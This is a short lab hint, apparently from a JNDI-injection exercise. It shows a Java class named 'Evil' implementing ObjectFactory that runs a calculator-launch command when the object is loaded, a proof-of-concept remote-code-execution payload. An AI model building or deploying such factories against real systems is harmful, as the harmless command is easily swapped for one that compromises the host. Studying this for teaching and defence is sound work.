# Hint 7

```java
public class Evil implements ObjectFactory {

   @Override
   public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
       Runtime.getRuntime().exec("open -a Calculator"); //for mac
       return null;
   }
}
```

